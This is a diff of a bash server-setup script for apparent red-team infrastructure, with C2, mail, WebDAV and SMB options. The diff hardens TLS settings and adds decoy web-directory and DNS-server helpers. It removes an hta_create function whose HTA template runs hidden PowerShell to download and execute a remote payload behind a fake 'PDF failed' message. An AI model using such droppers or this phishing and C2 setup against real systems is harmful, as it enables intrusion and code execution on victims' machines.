@@ -11,6 +11,12 @@ updateIP=$(curl icanhazip.com)
 
 ### Notification ###
 
+RED='\033[0;31m'
+LRED='\033[1;31m'
+GREEN='\033[0;32m'
+LGREEN='\033[1;32m'
+NC='\033[0m' # No Color
+
 if [[ $EUID -ne 0 ]]; then
     echo "Please run this script as root" 1>&2
     exit 1
@@ -20,12 +26,12 @@ fi
 
 function debian_initialize() {
     echo "Updating and Installing Dependencies"
-    echo "deb http://ftp.debian.org/debian stretch-backports main" >> /etc/apt/sources.list
+#    echo "deb http://ftp.debian.org/debian stretch-backports main" >> /etc/apt/sources.list
     apt-get -qq update > /dev/null 2>&1
     echo "...keep waiting..."
     apt-get -qq -y upgrade > /dev/null 2>&1
     echo -n "almost there..."
-    apt-get install -qq -y nmap apache2 curl tcpdump > /dev/null 2>&1
+    apt-get install -qq -y nmap jq apache2 curl tcpdump > /dev/null 2>&1
     apt-get install -qq -y procmail dnsutils screen zip ufw > /dev/null 2>&1
     echo -n "don't be impatient..."
     apt-get remove -qq -y exim4 exim4-base exim4-config exim4-daemon-light > /dev/null 2>&1
@@ -177,25 +183,6 @@ ENDOFRULES
     iptables -D ufw-before-input 3 2>&1
 }
 
-function add_firewall_rule() {
-    echo $'\nBefore continuing, make sure you have... \n\ttarget/host file with all your allowed hosts/ranges\n\tport file with all your allowed ports\n'
-    read -p "Enter your server IP address: " -r ipaddr
-    tgtsfile="/root/hosts.txt"
-    prtsfile="/root/ports.txt"
-    read -e -i "$tgtsfile" -p "Enter ALLOWED host file [full path]: " -r targetsfile
-    read -e -i "$prtsfile" -p "Enter ALLOWED port file [full path]: " -r portsfile
-    echo $'\n'
-    targetsfile="${targetsfile:-$tgtsfile}"
-    portsfile="${portsfile:-$prtsfile}"
-    printf 'y\n' | ufw enable > /dev/null 2>&1
-    for host in $(cat $targetsfile)
-        do for portno in $(cat $portsfile)
-            do ufw allow proto tcp from $host to $ipaddr port $portno > /dev/null 2>&1
-        done
-    done
-    ufw status numbered
-}
-
 function install_ssl_Cert() {
     if [ -d "/opt/letsencrypt/" ]
         then 
@@ -208,7 +195,7 @@ function install_ssl_Cert() {
         service apache2 stop
         apt-get update > /dev/null 2>&1
         #apt-get install -y python-certbot-apache -t stretch-backports > /dev/null 2>&1
-        apt-get install -y python-certbot-apache > /dev/null 2>&1
+        apt-get install -y python3-certbot-apache > /dev/null 2>&1
         git clone https://github.com/certbot/certbot.git /opt/letsencrypt > /dev/null 2>&1
     fi
 
@@ -570,6 +557,8 @@ function always_https() {
 EOF
     echo "[ + ]  Writing SSL config file"
     cat <<-EOF > /etc/apache2/sites-available/default-ssl.conf
+<IfModule mod_ssl.c>
+SSLStaplingCache shmcb:/var/logs/apache2/ocsp(128000)
 <VirtualHost _default_:443>
     <Directory "/var/www/html">
     AllowOverride All
@@ -587,9 +576,12 @@ EOF
     DocumentRoot /var/www/html
     ErrorLog \${APACHE_LOG_DIR}/error.log
     CustomLog \${APACHE_LOG_DIR}/access.log combined
-    SSLEngine on
-    SSLProtocol +TLSv1.1 +TLSv1.2 -SSLv2 -SSLv3
-    SSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH
+    SSLProtocol -TLSv1.1 +TLSv1.2 -SSLv2 -SSLv3
+    SSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH:HIGH:!aNULL:!MD5
+    SSLHonorCipherOrder on
+    SSLCompression off
+    SSLUseStapling on
+    SSLSessionTickets off
     SSLCertificateFile /etc/letsencrypt/live/${webaddr}/cert.pem
     SSLCertificateKeyFile /etc/letsencrypt/live/${webaddr}/privkey.pem
     SSLCertificateChainFile /etc/letsencrypt/live/${webaddr}/chain.pem
@@ -600,6 +592,7 @@ EOF
         SSLOptions +StdEnvVars
     </Directory>
 </VirtualHost>
+</IfModule>
 
 # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
 EOF
@@ -1006,51 +999,134 @@ function check_dkim() {
     fi
 }
 
-function check_arecord() {
-    read -p 'Enter your A Record domain name:  ' -r domain
-    echo " "
-    echo "[ / ] Checking A Record population "
-    sleep 1
-    count=1
-    while [ $count -gt 0 ]
-    do
-        if [[ $(nslookup ${domain}) != *find* ]]
-            then count=0
-            echo "[ + ] A record populated"
-            echo " "
-            else echo -n "."
-            sleep 10
-            (( count++ ))
+function random_web_structure() {
+    checkCommand=$( dpkg --get-selections | grep -E -v "deinstall" |grep '^jq' )
+    stringarray=($checkCommand)
+    if [[ -z $stringarray ]]
+    then 
+        apt -y -qq install jq
+    fi
+    
+    # Original website used in the curl statement below: https://randomwordgenerator.com/json/fake-words.json
+    # Using a saved version of the page since 1) it works for the purpose, and 2) will remain if/when the site owners change their code
+    # Adding the `if_` at the end of the archive.org DTG loads the website iframe, which is the actual site. Turns out archive.org shows you a version of the page in an iframe...
+    wordArray=( `curl -s -k 'https://web.archive.org/web/20221026204413if_/https://randomwordgenerator.com/json/fake-words.json' -A "Mozilla/5.0 (Windows NT 10.0; rv:106.0) Gecko/20100101 Firefox/106.0" | jq -r '.[] | .[].word'` )
+
+    chosenArray=()
+
+    for element in ${wordArray[@]}
+    do 
+    # the hash-sign within a variable provides the length of the variable output
+        if [[ ${#element} -ge 6 ]];
+        then
+            if [[ ${#element} -le 11 ]];
+            then   
+                chosenArray+=(${element});
+            fi
         fi
     done
-    printf 'y\n' | ufw enable > /dev/null 2>&1
-}
+    
+    # Original site for curl statement below: https://randomwordgenerator.com/json/sentences.json
+    # Alternate site: ` curl 'https://web.archive.org/web/20221027130921if_/https://contenttool.io/getSentencess' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:106.0) Gecko/20100101 Firefox/106.0' | jq '.[] | .text `
+    curl -s -q -k 'https://web.archive.org/web/20221027120623if_/https://randomwordgenerator.com/json/sentences.json' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:106.0) Gecko/20100101 Firefox/106.0' | jq -r '.[] | .[].sentence' > sentences.raw
 
-function hta_create() {
-    read -p 'Enter the client name:  ' -r ClientName
-    read -p 'Full URL to payload file: (ie: http://1.2.3.4:80/file) ' -r ServedFile
-    read -p 'Enter name for HTA file: (e.g. employee-survey.hta) ' -r NameHTA
-    cd /var/www/html
-    cat <<-EOF > /var/www/html/${NameHTA}
-<script language="VBScript">
-    Function var_func()
-        Dim var_shell
-        Set var_shell = CreateObject("Wscript.Shell")
-        var_shell.run "powershell.exe -exec bypass -w hidden -command \$wc = New-Object System.Net.Webclient; \$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); \$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; \$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (\$wc.downloadstring('${ServedFile}'))", 0, true
+    ### Randomizing Directory Structure
+    ### "one/two/three" is all lowercase
+    ### "fetch#" is randomized capitalization
+    one=${chosenArray[RANDOM% ${#chosenArray[@]}]}
+#    fetchOne=$( curl -s -k -q 'http://www.unit-conversion.info/texttools/randomcase/?ajax=1' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:106.0) Gecko/20100101 Firefox/106.0' --data-raw "form%5Btext%5D=${one}&out=" )
 
-    End Function
+    two=${chosenArray[RANDOM% ${#chosenArray[@]}]}
+#    fetchTwo=$( curl -s -k -q 'http://www.unit-conversion.info/texttools/randomcase/?ajax=1' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:106.0) Gecko/20100101 Firefox/106.0' --data-raw "form%5Btext%5D=${two}&out=" )
 
-    Function TestBox()
-        Msgbox "${ClientName} (PDF Failed to Decode!)"
-    End Function
+    three=${chosenArray[RANDOM% ${#chosenArray[@]}]}
+#    fetchThree=$( curl -s -k -q 'http://www.unit-conversion.info/texttools/randomcase/?ajax=1' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:106.0) Gecko/20100101 Firefox/106.0' --data-raw "form%5Btext%5D=${three}&out=" )
 
-    TestBox
-    var_func
+    webDir=""
 
-    self.close
-</script>
+    if [[ -d "/var/www/html" ]]; then
+        webDir="/var/www/html";
+    elif [[ -d "/var/www/" ]]; then
+        webDir="/var/www";
+    fi
+    
+    ### replace "one/two/three" with "fetch#" and uncomment lines above to enable random cApS
+    newDirStructure="${webDir}/${one}/${two}/${three}"
+
+    mkdir -p $newDirStructure
+
+    ### Creating index.html and randomizing contents within the file
+
+    dirOne="${webDir}/${one}/index.html"
+    dirTwo="${webDir}/${one}/${two}/index.html"
+    dirThree="${webDir}/${one}/${two}/${three}/index.html"
+
+    tagArray=("p" "b" "h1" "h2" "h3" "h4" "h5" "pre")
+    tagOne=${tagArray[RANDOM% ${#tagArray[@]}]}
+    tagTwo=${tagArray[RANDOM% ${#tagArray[@]}]}
+    tagThree=${tagArray[RANDOM% ${#tagArray[@]}]}
+
+    sentenceOne=$( cat sentences.raw | shuf -n 1 )
+    sentenceTwo=$( cat sentences.raw | shuf -n 1 )
+    sentenceThree=$( cat sentences.raw | shuf -n 1 )
+    
+    phraseOne=$( openssl rand -base64 $(shuf -i 1-60 -n1) | tr -d = | tr -d + | tr -d / )
+    phraseTwo=$( openssl rand -base64 $(shuf -i 1-60 -n1) | tr -d = | tr -d + | tr -d / )
+    phraseThree=$( openssl rand -base64 $(shuf -i 1-60 -n1) | tr -d = | tr -d + | tr -d / )
+
+    cat <<-EOF > $dirOne
+<html>
+    <head>
+    </head>
+    <body>
+        <$tagOne>$sentenceOne</$tagOne>
+        <$tagTwo style="font-size: 1; color: white">$phraseOne</$tagTwo>
+    </body>
+</html>
+
 EOF
-    printf 'y\n' | ufw enable > /dev/null 2>&1
+
+    cat <<-EOF > $dirTwo
+<html>
+    <head>
+    </head>
+    <body>
+        <$tagTwo>$sentenceTwo</$tagTwo>
+        <$tagThree style="font-size: 1; color: white">$phraseTwo</$tagThree>
+    </body>
+</html>
+
+EOF
+
+    cat <<-EOF > $dirThree
+<html>
+    <head>
+    </head>
+    <body>
+        <$tagThree>$sentenceThree</$tagThree>
+        <$tagOne style="font-size: 1; color: white">$phraseThree</$tagOne>
+    </body>
+</html>
+
+EOF
+
+    cat <<-EOF > $dirThree
+<html>
+    <head>
+    </head>
+    <body>
+        <$tagThree>$sentenceThree</$tagThree>
+        <$tagTwo style="font-size: 1; color: white">$phraseOne</$tagTwo>
+    </body>
+</html>
+
+EOF
+
+    rm sentences.raw
+    chown -R www-data:www-data $newDirStructure
+    echo ""
+    echo -e "${LGREEN}    [+] Your random web structure is:  ${newDirStructure}${NC}"
+    echo ""
 }
 
 function smb_share() {
@@ -1367,6 +1443,60 @@ EOF
     cd $originalDirectory
 }
 
+function obtain_dns_server() {
+    checkCommand=$( dpkg --get-selections | grep -E -v "deinstall" |grep '^jq' )
+    stringarray=($checkCommand)
+    if [[ -z $stringarray ]]
+    then 
+        apt -y -qq install jq
+    fi
+
+    UserAgent=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.100" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/104.2 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (compatible; Qwantify/1.0; +https://www.qwant.com/)" "Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.6.0.352) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36" "BlackBerry8520/5.0.0.681 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/600" "Mozilla/5.0 (compatible; U; Haiku x86; en-US) AppleWebKit/536.10 (KHTML, like Gecko) Haiku/R1 WebPositive/1.1 Safari/536.10")
+    UserAgentString=${UserAgent[RANDOM% ${#UserAgent[@]}]}
+
+    read -p "Do you want to randomize the country for privacy (y/N?)" answer
+    answer=${answer:-n}
+    case ${answer:0:1} in
+        y|Y )
+            countries=("br" "ch" "is" "no" "nl" "pt" "ro" "se")
+            randomCountry=${countries[RANDOM% ${#countries[@]}]}
+    #        fetchString=$( curl -s -k -q -A ${UserAgentString} https://public-dns.info/nameserver/${randomCountry}.html | grep "9. %" -a8 | grep -E -iv '^\d|^<|^$|REL|valid|unbound|%|^-|^—|redhat|\w{4}' > 0.raw; curl -s -k -q -A ${UserAgentString} https://public-dns.info/nameserver/${randomCountry}.html | grep "100 %" -a8 | grep -E -iv '^\d|^<|^$|REL|valid|unbound|%|^-|^—|redhat|\w{4}' >> 0.raw )
+            fetchString=$( curl -s -k -q -A ${UserAgentString} curl -s -q -k https://public-dns.info/nameserver/${randomCountry}.json | jq -r '.[] | .ip' | grep -iv '^\w[4]' > 0.raw )
+        ;;
+        * )
+            # fetchString=$( curl -s -k -q -A ${UserAgentString} https://public-dns.info/nameserver/us.html | grep "9. %" -a8 | grep -E -iv '^\d|^<|^$|REL|valid|unbound|%|^-|^—|redhat|\w{4}' > 0.raw; curl -s -k -q -A ${UserAgentString} https://public-dns.info/nameserver/us.html | grep "100 %" -a8 | grep -E -iv '^\d|^<|^$|REL|valid|unbound|%|^-|^—|redhat|\w{4}' >> 0.raw )
+            fetchString=$( curl -s -k -q -A ${UserAgentString} curl -s -q -k https://public-dns.info/nameserver/us.json | jq -r '.[] | .ip' | grep -iv '^\w[4]' > 0.raw )
+
+    esac
+
+    # curl -s -k -q -A ${UserAgentString} https://public-dns.info/nameserver/us.html | grep "9. %" -a8 | grep -E -iv '^\d|^<|^$|REL|valid|unbound|%|^-|^—|redhat|\w{4}' > 0.raw
+    # curl -s -k -q -A ${UserAgentString} https://public-dns.info/nameserver/us.html | grep "100 %" -a8 | grep -E -iv '^\d|^<|^$|REL|valid|unbound|%|^-|^—|redhat|\w{4}' >> 0.raw
+    sort -u 0.raw > dns.raw
+    rm 0.raw
+
+    count=0
+    while [ ${count} -lt 1 ] 
+    do
+        lineNumber=$(wc -l dns.raw | cut -d" " -f1)
+        randomLine=$((1 + $RANDOM % ${lineNumber}))
+        dnsServer=$(sed -n ${randomLine}p dns.raw)
+        verify=$(dig @${dnsServer} +noall +answer +time=2 google.com A)
+        if [[ $verify == ";; connection timed out; no servers could be reached" ]]
+            then 
+            echo ""
+            echo -e "${LRED}[-] DNS server wasn't working: ${dnsServer}"
+            echo $'\t...obtaining new server...'
+            count=0
+            else
+            echo ""
+            echo -e "${GREEN}[+] Use the following DNS Server: ${NC}${dnsServer}"
+            ((count++))
+        fi
+    done
+
+    echo "";curl https://ipinfo.io/${dnsServer};echo $'\n\n'
+}
+
 cat <<-EOF
      __                          __      _               
     / _\ ___ _ ____   _____ _ __/ _\ ___| |_ _   _ _ __  
@@ -1378,7 +1508,7 @@ cat <<-EOF
 EOF
 
 PS3="Server Setup Script - Pick an option: "
-options=("Debian Prep" "Account Setup" "Install SSL" "Install Mail Server" "Setup HTTPS Website" "HTTPS C2 Done Right" "Get DNS Entries" "Create HTA File" "Check DKIM" "Check A Records" "UFW allow hosts" "Setup SMB Share" "Setup WebDAV Share" "Install WebMail" "Roll da Domain" "Install VPN")
+options=("Debian Prep" "Account Setup" "Install SSL" "Install Mail Server" "Setup HTTPS Website" "HTTPS C2 Done Right" "Randomize Web Structure" "Get DNS Entries" "Check DKIM" "Setup SMB Share" "Setup WebDAV Share" "Install WebMail" "Roll da Domain" "Install VPN" "Obtain DNS Server")
 select opt in "${options[@]}" "Quit"; do
 
     case "$REPLY" in
@@ -1396,25 +1526,23 @@ select opt in "${options[@]}" "Quit"; do
 
     6) httpsc2doneright;;
 
-    7) get_dns_entries;;
-        
-    8) hta_create;;
+    7) random_web_structure;;
+
+    8) get_dns_entries;;
         
     9) check_dkim;;
-        
-    10) check_arecord;;
-        
-    11) add_firewall_rule;;
 
-    12) smb_share;;
+    10) smb_share;;
     
-    13) webdav_share;;
+    11) webdav_share;;
     
-    14) webmail_install;;
+    12) webmail_install;;
 
-    15) roll_domain;;
+    13) roll_domain;;
 
-    16) wireguard_install;;
+    14) wireguard_install;;
+
+    15) obtain_dns_server;;
 
     $(( ${#options[@]}+1 )) ) echo "Goodbye!"; break;;
     
